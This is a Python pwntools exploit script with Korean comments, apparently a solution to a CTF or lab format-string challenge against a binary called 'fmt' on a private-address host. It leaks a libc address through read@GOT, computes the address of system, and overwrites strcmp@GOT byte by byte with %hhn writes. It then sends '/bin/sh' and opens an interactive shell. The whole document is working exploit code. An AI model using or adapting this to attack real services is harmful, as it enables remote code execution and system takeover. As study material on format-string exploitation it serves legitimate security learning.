from pwn import *

e    = ELF('./fmt')
libc = ELF('./libc.so.6')
p    = remote('192.168.200.106', 10008)
# libc = e.libc
# p    = e.process()

'''
printf(rdi, rsi, rdx, rcx, r8, r9, *rsp, *(rsp + 8))
rdi       -> 포맷 스트링
rsi       -> 1$ 인자
rdx       -> 2$ 인자
*rsp      -> 6$ 인자
*(rsp+8n) -> (6+n)$ 인자
'''
# %7$s 로 읽는 이유) 6$부터 인자로 들어가나, 6$ 위치에는 반드시 포맷 스트링이 와야함
# 만약에 주소를 넣게 된다면 주소에 포함된 0으로 인해서 포맷스트링을 사용할 수 없음
# 따라서 7$ 위치에 주소를 넣고 해당 주소를 참조하는 방식으로 주소 휙득
payload  = b'%7$sAAAA'            # <- rsp
payload += p64(e.got['read'])     # <- rsp + 8

p.send(payload)

#######################################################################

read = u64(p.recvuntil(b'AAAA', drop=True).ljust(8,b'\x00'))
# print(hex(read))
libc_base = read - libc.symbols['read']
print(hex(libc_base))
system    = libc_base + libc.symbols['system']
print(hex(system))
			   
x = system&0xFF

payload  = f'%{x}c%15$hhn%{256-x}c'
x = (system>>8)&0xFF
payload += f'%{x}c%16$hhn%{256-x}c'
x = (system>>16)&0xFF
payload += f'%{x}c%17$hhn%{256-x}c'
x = (system>>24)&0xFF
payload += f'%{x}c%18$hhn%{256-x}c'

payload  = payload.ljust(72, 'A')

print(len(payload))

payload  = payload.encode()
payload += p64(e.got['strcmp']) 
payload += p64(e.got['strcmp'] + 1) 
payload += p64(e.got['strcmp'] + 2) 
payload += p64(e.got['strcmp'] + 3) 

p.sendafter(b'\n', payload)

sleep(0.1)
p.sendline(b'/bin/sh\x00')
p.sendline(b'/bin/sh\x00')
p.sendline(b'/bin/sh\x00')

p.interactive()













